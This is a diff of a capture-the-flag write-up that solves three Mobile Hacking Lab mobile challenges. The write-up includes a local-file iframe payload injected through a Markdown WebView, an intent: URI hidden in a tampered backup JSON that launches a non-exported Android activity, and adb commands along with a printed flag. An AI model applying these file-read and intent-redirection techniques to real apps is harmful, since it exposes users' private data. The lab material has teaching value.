@@ -7,6 +7,8 @@ description: " Organized by Mobile Hacking Lab and IT Harmony during Black Hat M
 useRelativeCover: true
 categories: [Mobile Hacking Lab]
 ---
+# Android
+## Parse & Pwn
 
 ![alt text](image-5.png)
 
@@ -74,166 +76,220 @@ public static final WebView WebViewContainer$lambda$14$lambda$13(Context context
     return webView;
 }
 ```
+The WebView is effectively configured as a full HTML renderer with local file read access. We craft a malicious markdown file.
 
+```xml
+<iframe src="file:///data/data/com.mobilehackinglab.markdownpreviewer/files/flag.txt"
+        width="100%" height="500">
+</iframe>
+```
 
- Code Analysis: Verified in MainActivity.kt that ensureFlagFile creates the flag at /data/data/com.mobilehackinglab.markdownpreviewer/files/flag.txt.
-  1 
-  2     Vulnerability Identification: The app uses a WebView to render Markdown, which allows raw HTML injection and has local file access enabled.
-  3 
-  4     Exploitation: Since JavaScript execution appeared disabled, I bypassed it using an <iframe> to load the local resource directly.
-  5 
-  6     Payload: shell:/sdcard/Download$ echo "<iframe src="file:///data/data/com.mobilehackinglab.markdownpreviewer/files/flag.txt" width="100%" height="500"></iframe>" >> exploit.md
-  7 
-  8     Result: The WebView rendered the iframe, retrieving the internal file and displaying the flag text within the preview window.
-  111111
+after crafting `exploit.md` we push it into the device
+
+```bash
+adb push exploit.md /sdcard/Download/
+exploit.md: 1 file pushed, 0 skipped. 0.5 MB/s (131 bytes in 0.000s)
+```
+
+Next we load the file and select our file and we get the flag.window.
+
+![alt text](image-8.png)
+
+The WebView rendered the iframe, retrieving the internal file and displaying the flag text within the preview 
+
+## Tide Lock
+
 ![alt text](image-1.png)
 
-We can exploit this to inject a malicious Intent URI. When you restore and click the link in the app, the app itself will launch the hidden FlagActivity.
-Step-by-Step Guide
+Reversing the apk we find several `Activities`.
+* `MainActivity`.
+* `LockerActivity`
+* `CreateMasterPasswordActivity`
+* `FlagActivity`
+* `EditPasswordActivity`
 
-    Create a Dummy Entry:
+```xml
+<activity
+	android:name="com.mobilehackinglab.yay.tidelock.MainActivity"
+	android:exported="true">
+	<intent-filter>
+		<action android:name="android.intent.action.MAIN"/>
+		<category android:name="android.intent.category.LAUNCHER"/>
+	</intent-filter>
+</activity>
+<activity
+	android:name="com.mobilehackinglab.yay.tidelock.LockerActivity"
+	android:exported="false"/>
+<activity
+	android:name="com.mobilehackinglab.yay.tidelock.CreateMasterPasswordActivity"
+	android:exported="false"/>
+<activity
+	android:name="com.mobilehackinglab.yay.tidelock.FlagActivity"
+	android:exported="false"/>
+<activity
+	android:name="com.mobilehackinglab.yay.tidelock.EditPasswordActivity"
+	android:exported="false"/>
+```
 
-        Open the app and log in.
+The app allows us to create a password and login. The app also offers a backup feature, which exports all entries to external storage in a readable JSON file in `PasswordRepository`. The backup file is written to external storage, which is:
 
-        Create a new password entry.
+* readable by the user,
+* modifiable by the user,
+* and modifiable by any app with storage access.
 
-        Set the URL to something easy to find, like: https://FIND_ME_HERE.com
+There is no integrity protection, no signatures, and no encryption on the backup.
 
-        Fill in other fields with junk and save.
+```java
+public final boolean yaybackupentriesyay() {
+	String json = this.yaygsonyay.toJson(yayloadentriesyay());
+	File file = new File(this.yaycontextyay.getExternalFilesDir(null), this.yaybackupfileyay);
+	if (file.exists()) {
+		file.delete();
+	}
+	try {
+		Intrinsics.checkNotNull(json);
+		FilesKt.writeText$default(file, json, null, 2, null);
+		return true;
+	} catch (Exception e) {
+		e.printStackTrace();
+		return false;
+	}
+}
+```
 
-    Create a Backup:
+This means the restored data is simply trusted
 
-        Tap the Backup button.
+```java
+public final boolean yayrestoreentriesyay() {
+	File file = new File(this.yaycontextyay.getExternalFilesDir(null), this.yaybackupfileyay);
+	if (!file.exists()) {
+		return false;
+	}
+	try {
+		Object fromJson = this.yaygsonyay.fromJson(FilesKt.readText$default(file, null, 1, null), new TypeToken<List<? extends PasswordEntry>>() { // from class: com.mobilehackinglab.yay.tidelock.PasswordRepository$yayrestoreentriesyay$yaytypeyay$1
+		}.getType());
+		Intrinsics.checkNotNullExpressionValue(fromJson, "fromJson(...)");
+		yaysaveentriesyay((List) fromJson);
+		return true;
+	} catch (Exception e) {
+		e.printStackTrace();
+		return false;
+	}
+}
+```
 
-        The app will say "Backup successful".
+The manifest contains a private, non-exported activity which we need to open to get a flag. 
+> NB: We cannot use Frida since we cannot gain root access in the remote device. If we try patching the apk with objection we will have to unistall the first one which will remove the flag.txt file. So we have to find a way to open `FlagActivity` without any of those options.
 
-        Because the dialog warns about "other applications reading it", the file is saved to External Storage.
+```xml
+<activity
+    android:name="com.mobilehackinglab.yay.tidelock.FlagActivity"
+    android:exported="false"/>
+```
 
-    Locate and Edit the Backup File:
+Marking it as `exported="false"` prevents other apps from launching it directly. However, Android supports the `intent:` URI syntax a schema designed to allow links inside apps to launch internal components. If the app opens user-supplied URLs using `startActivity()`, then any unvalidated link that is restored from backup can be used to trigger internal activities from inside the app itself. This bypasses the exported restriction because the calling UID is the same as the owning app.
 
-        Connect your phone to your PC.
+Loking at the `PasswordDetailDialogFragment`. We notice the following on `onViewCreated$lambda$7`.
 
-        Navigate to the app's external data folder. It is usually located at:
-        Internal Storage > Android > data > com.mobilehackinglab.yay.tidelock > files > backup.json
-        (The filename might be different, e.g., passwords.json or backup.txt).
+* Get the URL: It retrieves the website URL ,which we injected with the intent: URI, from the `yayentryyay` object.
+* Create the Intent: It uses `Intent.parseUri()` with the URL string. Since the string starts with intent:, it successfully creates a malicious Intent targeting FlagActivity.
+* Launch the Intent: It calls `startActivity(intent)`, which launches the private activity because the call originates from the app's own UID.
 
-        Open the file with a text editor.
+```java
+public static final void onViewCreated$lambda$7(final PasswordDetailDialogFragment this$0, View yayviewyay, View view) {
+	Intrinsics.checkNotNullParameter(this$0, "this$0");
+	Intrinsics.checkNotNullParameter(yayviewyay, "$yayviewyay");
+	PasswordEntry passwordEntry = this$0.yayentryyay;
+	if (passwordEntry == null) {
+		Intrinsics.throwUninitializedPropertyAccessException("yayentryyay");
+		passwordEntry = null;
+	}
+	String url = passwordEntry.getUrl();
+	if (StringsKt.startsWith$default(url, NativeUtils.INSTANCE.decodeScheme(new byte[]{67, 68, 94, 79, 68, 94, 16}), false, 2, (Object) null)) {
+		try {
+			Intent parseUri = Intent.parseUri(url, 1);
+			NativeUtils nativeUtils = NativeUtils.INSTANCE;
+			Intrinsics.checkNotNull(parseUri);
+			nativeUtils.sanitizeIntent(parseUri);
+			parseUri.addFlags(268435456);
+			yayviewyay.getContext().startActivity(parseUri);
+			return;
+		} catch (URISyntaxException e) {
+			e.printStackTrace();
+			Toast.makeText(this$0.getContext(), "Invalid URL", 0).show();
+			return;
+		}
+	}
+	if (StringsKt.startsWith$default(url, NativeUtils.INSTANCE.decodeScheme(new byte[]{66, 94, 94, 90, 16, 5, 5}), false, 2, (Object) null) || StringsKt.startsWith$default(url, NativeUtils.INSTANCE.decodeScheme(new byte[]{66, 94, 94, 90, 89, 16, 5, 5}), false, 2, (Object) null)) {
+		ExecutorService newSingleThreadExecutor = Executors.newSingleThreadExecutor();
+		final Handler handler = new Handler(Looper.getMainLooper());
+		newSingleThreadExecutor.execute(new Runnable() { // from class: com.mobilehackinglab.yay.tidelock.PasswordDetailDialogFragment$$ExternalSyntheticLambda0
+			@Override // java.lang.Runnable
+			public final void run() {
+				PasswordDetailDialogFragment.onViewCreated$lambda$7$lambda$6(PasswordDetailDialogFragment.this, handler);
+			}
+		});
+		return;
+	}
+	Toast.makeText(this$0.getContext(), "Invalid URL", 0).show();
+}
+```
 
-        Find your dummy URL: https://FIND_ME_HERE.com
+The backup files are located at.
 
-        Replace that URL with this specific Intent URI:
-        code Text
+```bash
+shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ cat passwords.json
+[{"password":"12121","url":"https://gshas","username":"1212","website":"gmail"},{"password":"binder","url":"https://exploit.com","username":"binder","website":"exploit"}]
+```
 
-        
-    intent:#Intent;component=com.mobilehackinglab.yay.tidelock/.FlagActivity;end
+we pull the file 
 
-      
+```bash
+adb pull /sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/passwords.json .
+/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/passwords.json: 1 file pulled, 0 skipped. 0.0 MB/s (170 bytes in 0.227s)
+```
 
-Restore the Malicious Backup:
+we edit the json file and push it back
 
-    Save the file and ensure it's back on the phone.
+```bash
+adb push passwords.json /sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/
+passwords.json: 1 file pushed, 0 skipped. 0.9 MB/s (229 bytes in 0.000s)
+```
 
-    Open the TideLock app.
+we confirm the file
 
-    Tap the Restore button.
+```bash
+shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ cat passwords.json 
+[{"password":"12121","url":"https://gshas","username":"1212","website":"gmail"},{"password":"binder","url": "intent:#Intent;component=com.mobilehackinglab.yay.tidelock/.FlagActivity;end","username":"binder","website":"exploit"}]
+```
 
-    The list should refresh. Your entry should now contain the hidden malicious link (though it might look blank or weird).
-
-Trigger the Exploit:
-
-    Tap on the password entry you just restored to view its details.
-
-    Tap on the URL (or the "Globe"/Launch icon next to it).
-
-    This will force the app to execute the URI. Since the URI points to FlagActivity and originates from the app itself, it bypasses the exported="false" check and the NativeUtils check.
-
-Get the Flag:
-
-    The FlagActivity will open and display the flag.
-
-    Even if it crashes or closes quickly, the code you shared earlier confirms it copies the flag to a public file:
-    Internal Storage > Android > data > com.mobilehackinglab.yay.tidelock > files > flag.txt
+This is the list of our data now.
 
 ![alt text](image-2.png)
 
-    adb shell
-shell:/$ cd Android                                                                                                                                                                                         
-sh: cd: Android: No such file or directory
-shell:/$ cd sdcard
-shell:/sdcard$ ls
-Alarms  Android  Audiobooks  DCIM  Documents  Download  Movies  Music  Notifications  Pictures  Podcasts  Recordings  Ringtones
-shell:/sdcard$ cd Android
-shell:/sdcard/Android$ ls
-data  media  obb
-shell:/sdcard/Android$ cd data
-shell:/sdcard/Android/data$ ls
-com.mobilehackinglab.yay.tidelock
-shell:/sdcard/Android/data$ cd com.mobilehackinglab.yay.tidelock/
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock$ ls
-files
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock$ cd files
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ ls
-passwords.json
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ cat passwords.json
-[{"password":"12121","url":"https://gshas","username":"1212","website":"gmail"},{"password":"binder","url":"https://exploit.com","username":"binder","website":"exploit"}]shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ ls
-passwords.json
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ rm passwords.json 
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ ls
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ ls
-passwords.json
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ cat passwords.json 
-[{"password":"12121","url":"https://gshas","username":"1212","website":"gmail"},{"password":"binder","url": "intent:#Intent;component=com.mobilehackinglab.yay.tidelock/.FlagActivity;end","username":"binder","website":"exploit"}]
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ ⏎     
+This is triggered when we click fetch favicon.
 
-    adb shell
-shell:/$ cd Android                                                                                                                                                                                         
-sh: cd: Android: No such file or directory
-shell:/$ cd sdcard
-shell:/sdcard$ ls
-Alarms  Android  Audiobooks  DCIM  Documents  Download  Movies  Music  Notifications  Pictures  Podcasts  Recordings  Ringtones
-shell:/sdcard$ cd Android
-shell:/sdcard/Android$ ls
-data  media  obb
-shell:/sdcard/Android$ cd data
-shell:/sdcard/Android/data$ ls
-com.mobilehackinglab.yay.tidelock
-shell:/sdcard/Android/data$ cd com.mobilehackinglab.yay.tidelock/
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock$ ls
-files
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock$ cd files
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ ls
-passwords.json
-shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ cat passwords.json
-[{"password":"12121","url":"https://gshas","username":"1212","website":"gmail"},{"password":"binder","url":"https://exploit.com","username":"binder","website":"exploit"}]shell:/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files$ 
+![alt text](image-9.png)
 
-󰪢 0s 󰜥 󰉋   /  /mhl 
-    adb pull /sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/backup.json .
-adb: error: failed to stat remote object '/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/backup.json': No such file or directory
-󰪢 0s 󰜥 󰉋   /  /mhl 
-    adb pull /sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/passwords.json .
-/sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/passwords.json: 1 file pulled, 0 skipped. 0.0 MB/s (170 bytes in 0.227s)
-󰪢 0s 󰜥 󰉋   /  /mhl 
-    vim passwords.json 
-󰪢 22s 󰜥 󰉋   /  /mhl 
-    adb push passwords.json /sdcard/Android/data/com.mobilehackinglab.yay.tidelock/files/
-passwords.json: 1 file pushed, 0 skipped. 0.9 MB/s (229 bytes in 0.000s)
+Finally the activity is launched with the flag
 
 ![alt text](image-3.png)
 
-
-
-![alt text](image-4.png)
-
-
-![alt text](image-5.png)
-
-
-![alt text](image-6.png)
+# iOS
+## Link Liar
 
 ![alt text](image-7.png)
 
+We unzip the `ipa` file as usual
+
+```bash
+unzip Linkliar.ipa
+```
+
+We check the `Info.xml`. to see is there is anything interesting but none
+
 ```xml
-    cat Info.xml 
+cat Info.xml 
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -247,130 +303,9 @@ passwords.json: 1 file pushed, 0 skipped. 0.9 MB/s (229 bytes in 0.000s)
 	<key>CFBundleExecutable</key>
 	<string>Linkliar</string>
 	<key>CFBundleIcons</key>
-	<dict>
-		<key>CFBundlePrimaryIcon</key>
-		<dict>
-			<key>CFBundleIconFiles</key>
-			<array>
-				<string>AppIcon60x60</string>
-			</array>
-			<key>CFBundleIconName</key>
-			<string>AppIcon</string>
-		</dict>
-	</dict>
-	<key>CFBundleIcons~ipad</key>
-	<dict>
-		<key>CFBundlePrimaryIcon</key>
-		<dict>
-			<key>CFBundleIconFiles</key>
-			<array>
-				<string>AppIcon60x60</string>
-				<string>AppIcon76x76</string>
-			</array>
-			<key>CFBundleIconName</key>
-			<string>AppIcon</string>
-		</dict>
-	</dict>
-	<key>CFBundleIdentifier</key>
-	<string>com.mobilehackinglab.Linkliar</string>
-	<key>CFBundleInfoDictionaryVersion</key>
-	<string>6.0</string>
-	<key>CFBundleName</key>
-	<string>Linkliar</string>
-	<key>CFBundlePackageType</key>
-	<string>APPL</string>
-	<key>CFBundleShortVersionString</key>
-	<string>1.0</string>
-	<key>CFBundleSupportedPlatforms</key>
-	<array>
-		<string>iPhoneOS</string>
-	</array>
-	<key>CFBundleURLTypes</key>
-	<array>
-		<dict>
-			<key>CFBundleURLName</key>
-			<string>linkliar</string>
-			<key>CFBundleURLSchemes</key>
-			<array>
-				<string>linkliar</string>
-			</array>
-		</dict>
-	</array>
-	<key>CFBundleVersion</key>
-	<string>1</string>
-	<key>DTCompiler</key>
-	<string>com.apple.compilers.llvm.clang.1_0</string>
-	<key>DTPlatformBuild</key>
-	<string>23A339</string>
-	<key>DTPlatformName</key>
-	<string>iphoneos</string>
-	<key>DTPlatformVersion</key>
-	<string>26.0</string>
-	<key>DTSDKBuild</key>
-	<string>23A339</string>
-	<key>DTSDKName</key>
-	<string>iphoneos26.0</string>
-	<key>DTXcode</key>
-	<string>2601</string>
-	<key>DTXcodeBuild</key>
-	<string>17A400</string>
-	<key>LSRequiresIPhoneOS</key>
-	<true/>
-	<key>MinimumOSVersion</key>
-	<string>15.4</string>
-	<key>NSAppTransportSecurity</key>
-	<dict>
-		<key>NSAllowsArbitraryLoads</key>
-		<true/>
-		<key>NSExceptionDomains</key>
-		<dict/>
-	</dict>
-	<key>UIApplicationSceneManifest</key>
-	<dict>
-		<key>UIApplicationSupportsMultipleScenes</key>
-		<false/>
-		<key>UISceneConfigurations</key>
-		<dict>
-			<key>UIWindowSceneSessionRoleApplication</key>
-			<array>
-				<dict>
-					<key>UISceneConfigurationName</key>
-					<string>Default Configuration</string>
-					<key>UISceneDelegateClassName</key>
-					<string>SceneDelegate</string>
-					<key>UISceneStoryboardFile</key>
-					<string>Main</string>
-				</dict>
-			</array>
-		</dict>
-	</dict>
-	<key>UIApplicationSupportsIndirectInputEvents</key>
-	<true/>
-	<key>UIDeviceFamily</key>
-	<array>
-		<integer>1</integer>
-		<integer>2</integer>
-	</array>
-	<key>UILaunchStoryboardName</key>
-	<string>LaunchScreen</string>
-	<key>UIMainStoryboardFile</key>
-	<string>Main</string>
-	<key>UIRequiredDeviceCapabilities</key>
-	<array>
-		<string>arm64</string>
-	</array>
-	<key>UISupportedInterfaceOrientations</key>
-	<array>
-		<string>UIInterfaceOrientationPortrait</string>
-		<string>UIInterfaceOrientationLandscapeLeft</string>
-		<string>UIInterfaceOrientationLandscapeRight</string>
-	</array>
-	<key>UISupportedInterfaceOrientations~ipad</key>
-	<array>
-		<string>UIInterfaceOrientationPortrait</string>
-		<string>UIInterfaceOrientationPortraitUpsideDown</string>
-		<string>UIInterfaceOrientationLandscapeLeft</string>
-		<string>UIInterfaceOrientationLandscapeRight</string>
+
+	...
+
 	</array>
 	<key>UISupportedInterfaceOrientations~iphone</key>
 	<array>
@@ -382,8 +317,10 @@ passwords.json: 1 file pushed, 0 skipped. 0.9 MB/s (229 bytes in 0.000s)
 </plist>
 ```
 
+Next we try to grep for the flag format and boom there we go. We get the flag
+
 ```bash
-    strings Linkliar | grep -i "MHL" -A 5
+strings Linkliar | grep -i "MHL" -A 5
 MHL{h34d3r_
 s0_l0ng_th4
 t_1t_0v3rfl0ws}
